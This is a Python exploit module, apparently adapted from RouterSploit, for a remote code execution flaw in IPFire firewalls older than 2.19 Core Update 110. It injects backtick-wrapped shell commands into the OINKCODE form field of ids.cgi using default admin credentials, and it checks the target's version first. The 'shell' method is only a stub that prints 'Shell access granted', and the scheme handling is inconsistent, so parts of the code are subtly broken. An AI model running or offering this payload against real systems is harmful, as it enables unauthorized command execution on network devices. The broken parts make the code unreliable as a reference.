# rsf exploit module
# description: Module exploits IPFire < 2.19 Core Update 110 Remote Code Execution vulnerability 
# which allows executing command on operating system level.

import re
import requests

class Exploit:
    __info__ = {
        "name": "IPFire Oinkcode RCE",
        "description": "Module exploits IPFire < 2.19 Core Update 110 Remote Code Execution vulnerability "
                       "which allows executing command on operating system level.",
        "authors": (
            "0x09AL",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/42149/",
        ),
        "devices": (
            "IPFire < 2.19 Core Update 110",
        )
    }

    def __init__(self, target, port=444, ssl=True, username="admin", password="admin"):
        self.target = target
        self.port = port
        self.ssl = ssl
        self.username = username
        self.password = password

    def run(self):
        if self.check():
            print("Target is vulnerable")
            print("Invoking command loop...")
            self.shell()
        else:
            print("Target is not vulnerable")

    def execute(self, cmd):
        headers = {
            "Referer": f"{'https' if self.ssl else 'http'}://{self.target}:{self.port}/cgi-bin/ids.cgi"
        }

        payload = f"`{cmd}`"

        data = {
            "ENABLE_SNORT_GREEN": "on",
            "ENABLE_SNORT": "on",
            "RULES": "registered",
            "OINKCODE": payload,
            "ACTION": "Download new ruleset",
            "ACTION2": "snort"
        }

        response = requests.post(f"http://{self.target}:{self.port}/cgi-bin/ids.cgi", headers=headers, data=data, auth=(self.username, self.password))

        return response.text

    def check(self):
        response = requests.get(f"http://{self.target}:{self.port}/cgi-bin/pakfire.cgi", auth=(self.username, self.password))

        if response.status_code == 200:
            res = re.findall(r"IPFire ([\d.]{4}) \([\w]+\) - Core Update ([\d]+)", response.text)
            if res:
                version = res[0][0]
                update = int(res[0][1])

                if version <= "2.19" and update <= 110:
                    return True

        return False

    def shell(self):
        print("Shell access granted")


